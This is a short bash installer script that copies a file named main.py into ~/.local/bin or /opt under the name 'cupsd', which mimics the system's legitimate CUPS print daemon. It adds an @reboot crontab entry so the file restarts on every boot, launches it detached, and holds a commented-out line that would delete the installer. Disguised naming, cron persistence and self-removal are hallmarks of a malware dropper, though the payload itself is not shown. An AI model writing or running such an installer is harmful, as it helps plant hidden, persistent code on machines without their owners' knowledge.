#!/bin/bash

# depends on python3 cp pwd, make sure they exist on target system
for dep in python3 cp pwd; do
    if ! command -v $dep > /dev/null; then
        printf "%s not found, please install %s\n" "$dep" "$dep"
        exit 1
    fi
done

CURRENT_PATH="$(dirname -- "${BASH_SOURCE[0]}")"
CURRENT_PATH="$(cd -- "$CURRENT_PATH" && pwd)"
if [[ -z "$CURRENT_PATH" ]] ; then
  # error if path is not accessible
  exit 1
fi

if [ "$EUID" -ne 0 ]
then
    read -e -p "root access not found, install as user $(whoami)? [y/n] " choice
    [[ "$choice" == [Yy]* ]] && echo "" || exit 1
    cp main.py ~/.local/bin/cupsd
    chmod +x ~/.local/bin/cupsd
    crontab -l > mycron
    echo "@reboot ~/.local/bin/cupsd" >> mycron
    crontab mycron
    rm mycron
    ~/.local/bin/cupsd
    disown
else
    echo "root access found"
    cp main.py /opt/cupsd
    chmod +x /opt/cupsd
    echo "@reboot /opt/cupsd" >> /etc/crontab
    /opt/cupsd
    disown
fi

# rm "$CURRENT_PATH/installer.sh"